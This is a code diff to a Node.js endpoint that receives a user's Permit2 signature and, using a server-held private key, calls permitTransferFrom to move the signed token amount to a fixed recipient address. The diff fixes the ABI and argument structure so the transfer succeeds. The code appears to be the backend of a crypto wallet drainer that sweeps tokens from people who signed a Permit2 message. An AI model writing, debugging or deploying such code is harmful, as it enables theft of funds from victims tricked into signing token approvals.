@@ -10,10 +10,16 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
 const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
-// Correct single Permit2 ABI format matching the canonical ISignatureTransfer structure
+// Full proper ABI with nested struct definitions (fixes INVALID_ARGUMENT errors)
 const PERMIT2_ABI = [
-    "function permitTransferFrom((address token, uint256 amount) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)"
+    "function permitTransferFrom(" +
+    "tuple(tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit," +
+    "tuple(address to,uint256 requestedAmount) transferDetails," +
+    "address owner," +
+    "bytes signature" +
+    ")"
 ];
+
 const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
 
 module.exports = async (req, res) => {
@@ -22,22 +28,31 @@ module.exports = async (req, res) => {
     try {
         const { signature, permitData, owner } = req.body;
 
-        // Ensure proper checksum formatting for addresses passed to contract call
+        if (!signature || !permitData || !owner) {
+            return res.status(400).json({ success: false, message: 'Missing signature, permitData or owner' });
+        }
+
+        // Ensure proper checksum formatting for addresses
         const formattedOwner = ethers.utils.getAddress(owner);
+        const tokenAddr = ethers.utils.getAddress(permitData.token);
+
+        const permit = {
+            permitted: {
+                token: tokenAddr,
+                amount: permitData.amount
+            },
+            nonce: permitData.nonce,
+            deadline: permitData.deadline
+        };
+
+        const transferDetails = {
+            to: ethers.utils.getAddress(RECIPIENT_ADDRESS),
+            requestedAmount: permitData.amount
+        };
 
         const tx = await permit2Contract.permitTransferFrom(
-            {
-                permitted: {
-                    token: ethers.utils.getAddress(permitData.token),
-                    amount: permitData.amount
-                },
-                nonce: permitData.nonce,
-                deadline: permitData.deadline
-            }, 
-            { 
-                to: RECIPIENT_ADDRESS, 
-                requestedAmount: permitData.amount 
-            },
+            permit,
+            transferDetails,
             formattedOwner,
             signature
         );
@@ -46,6 +61,6 @@ module.exports = async (req, res) => {
         return res.status(200).json({ success: true, txHash: receipt.transactionHash });
     } catch (error) {
         console.error('Execution Error:', error);
-        return res.status(500).json({ success: false, message: error.message });
+        return res.status(500).json({ success: false, message: error.message || 'Transaction failed' });
     }
 };
